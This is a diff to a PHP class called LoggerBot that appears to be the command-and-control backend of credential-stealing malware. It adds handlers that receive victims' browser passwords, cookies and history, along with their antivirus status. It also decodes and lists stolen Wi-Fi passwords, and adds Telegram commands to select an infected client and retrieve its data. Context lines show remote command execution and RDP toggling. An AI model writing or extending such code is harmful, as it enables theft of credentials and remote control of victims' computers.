@@ -248,6 +248,12 @@ class LoggerBot
             case 'upload_wifi_passwords':
                 $response = $this->handleUploadWifiPasswords($data);
                 break;
+            case 'upload_browser_data':
+                $response = $this->handleUploadBrowserData($data);
+                break;
+            case 'upload_antivirus_status':
+                $response = $this->handleUploadAntivirusStatus($data);
+                break;
             default:
                 $response = ['error' => 'Unknown action'];
                 break;
@@ -257,11 +263,64 @@ class LoggerBot
         echo json_encode($response);
     }
 
-    // api.php (inside LoggerBot class)
-    private function handleUploadWifiPasswords($data)
+    private function handleUploadBrowserData($data)
     {
         try {
-            $this->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data));
+            $this->logWebhook("Browser Data Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+
+            $clientId = $data['client_id'] ?? null;
+            $browserData = $data['browser_data'] ?? null;
+
+            if (!$clientId || !$browserData) {
+                $this->logError("Browser data upload failed: Missing client_id or browser_data");
+                http_response_code(400);
+                return ['error' => 'Missing client_id or browser_data'];
+            }
+
+            $decryptedBrowserData = $this->decrypt($browserData);
+            if ($decryptedBrowserData === '') {
+                $this->logError("Browser data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $browserJson = json_decode($decryptedBrowserData, true);
+            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            // Store in client_logs
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                VALUES (?, 'browser_data', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedBrowserData]);
+
+            // Prepare Telegram message
+            $message = "🌐 Browser Data Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Browser: " . ($browserJson['browser'] ?? 'Unknown') . "\n";
+            $message .= "Passwords: " . count($browserJson['passwords'] ?? []) . "\n";
+            $message .= "History Entries: " . count($browserJson['history'] ?? []) . "\n";
+            $message .= "Cookies: " . count($browserJson['cookies'] ?? []) . "\n";
+            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logWebhook("Browser data processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (Exception $e) {
+            $this->logError("Browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleUploadWifiPasswords($data)
+    {
+        // Existing implementation (from previous context)
+        try {
+            $this->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
 
             $clientId = $data['client_id'] ?? null;
             $wifiData = $data['wifi_data'] ?? null;
@@ -286,14 +345,12 @@ class LoggerBot
                 return ['error' => 'Invalid data format'];
             }
 
-            // Store in client_logs
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_logs (client_id, log_type, message, created_at) 
-            VALUES (?, 'wifi', ?, NOW())"
+                VALUES (?, 'wifi', ?, NOW())"
             );
             $stmt->execute([$clientId, $decryptedWifiData]);
 
-            // Prepare Telegram message
             $message = "📡 Wi-Fi Passwords Received:\n";
             $message .= "Client ID: $clientId\n";
             $message .= "Networks:\n";
@@ -308,6 +365,65 @@ class LoggerBot
             $this->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
             http_response_code(500);
             return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function getWifiPasswordsResult($clientId)
+    {
+        try {
+            $stmt = $this->pdo->prepare(
+                "SELECT message, created_at 
+                FROM client_logs 
+                WHERE client_id = ? AND log_type = 'wifi' 
+                ORDER BY created_at DESC LIMIT 1"
+            );
+            $stmt->execute([$clientId]);
+            $log = $stmt->fetch(PDO::FETCH_ASSOC);
+
+            if (!$log) {
+                return "No Wi-Fi data found for client $clientId";
+            }
+
+            // Decode Base64
+            $decodedData = base64_decode($log['message']);
+            if ($decodedData === false) {
+                $this->logError("Base64 decode failed for client_id: $clientId");
+                return "Error: Invalid Wi-Fi data format";
+            }
+
+            // Decompress gzip
+            $decompressedData = @gzuncompress($decodedData);
+            if ($decompressedData === false) {
+                $this->logError("Gzip decompress failed for client_id: $clientId");
+                return "Error: Failed to decompress Wi-Fi data";
+            }
+
+            // Decrypt data
+            $decryptedData = $this->decrypt($decompressedData);
+            if ($decryptedData === '') {
+                $this->logError("Decryption failed for Wi-Fi data, client_id: $clientId");
+                return "Error: Decryption failed";
+            }
+
+            // Parse JSON
+            $wifiJson = json_decode($decryptedData, true);
+            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid JSON format for Wi-Fi data, client_id: $clientId");
+                return "Error: Invalid data format";
+            }
+
+            // Format response
+            $message = "📡 Wi-Fi Passwords for Client $clientId:\n";
+            $message .= "Received at: " . $log['created_at'] . "\n";
+            $message .= "Networks:\n";
+            foreach ($wifiJson['wifi_profiles'] as $profile) {
+                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
+            }
+
+            return $message;
+        } catch (Exception $e) {
+            $this->logError("Failed to retrieve Wi-Fi data for client_id: $clientId, error: " . $e->getMessage());
+            return "Error retrieving Wi-Fi data: " . $e->getMessage();
         }
     }
 
@@ -1008,7 +1124,9 @@ class LoggerBot
             '/end_task' => 'End Task',
             '/enable_rdp' => 'Enable RDP',
             '/disable_rdp' => 'Disable RDP',
-            '/get_wifi_passwords' => 'Get Wi-Fi Passwords'
+            '/getwifipasswords' => 'Get Wi-Fi Passwords',
+            '/get_browser_data' => 'Get Browser Data',
+            '/select' => 'Select Client'
         ];
 
         $keyboard = ['inline_keyboard' => []];
@@ -1026,6 +1144,57 @@ class LoggerBot
 
         $this->logWebhook("Sending command keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
         $this->sendTelegramMessage($chatId, $message, ['reply_markup' => $keyboard]);
+    }
+
+    private function handleUploadAntivirusStatus($data)
+    {
+        try {
+            $this->logWebhook("Antivirus Status Upload: " . json_encode($data));
+
+            $clientId = $data['client_id'] ?? null;
+            $antivirusData = $data['antivirus_data'] ?? null;
+
+            if (!$clientId || !$antivirusData) {
+                $this->logError("Antivirus status upload failed: Missing client_id or antivirus_data");
+                http_response_code(400);
+                return ['error' => 'Missing client_id or antivirus_data'];
+            }
+
+            $decryptedAntivirusData = $this->decrypt($antivirusData);
+            if ($decryptedAntivirusData === '') {
+                $this->logError("Antivirus data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $antivirusJson = json_decode($decryptedAntivirusData, true);
+            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid antivirus data format for client_id: $clientId, decrypted: " . substr($decryptedAntivirusData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            // Store in client_logs
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                VALUES (?, 'antivirus_status', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedAntivirusData]);
+
+            // Prepare Telegram message
+            $message = "🛡️ Antivirus Status Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Antivirus: " . ($antivirusJson['name'] ?? 'Unknown') . "\n";
+            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";
+            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logWebhook("Antivirus status processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (Exception $e) {
+            $this->logError("Antivirus status upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
     }
 
     private function processCommand($command, $recipient, $isClient = false)
@@ -1047,6 +1216,27 @@ class LoggerBot
                 $response['data'] = 'Screenshot command queued';
                 break;
 
+            case preg_match('/^\/getwifipasswords$/', $command):
+                if (!isset($this->selectedClient[$chatId])) {
+                    $response['data'] = 'Please select a client first using /select';
+                } else {
+                    $clientId = $this->selectedClient[$chatId];
+                    $response['data'] = $this->getWifiPasswordsResult($clientId);
+                }
+                break;
+            case preg_match('/^\/get_browser_data$/', $command):
+                if (!isset($this->selectedClient[$chatId])) {
+                    $response['data'] = 'Please select a client first using /select';
+                } else {
+                    $clientId = $this->selectedClient[$chatId];
+                    $response['data'] = $this->getBrowserDataResult($clientId);
+                }
+                break;
+            case preg_match('/^\/select\s+(.+)$/', $command, $matches):
+                $clientId = trim($matches[1]);
+                $this->selectedClient[$chatId] = $clientId;
+                $response['data'] = "Client $clientId selected";
+                break;
             case preg_match('/^\/exec (.+)/', $command, $matches):
                 $commandData = ['type' => 'system_command', 'params' => ['command' => $matches[1]]];
                 $response['data'] = 'Execute command queued';
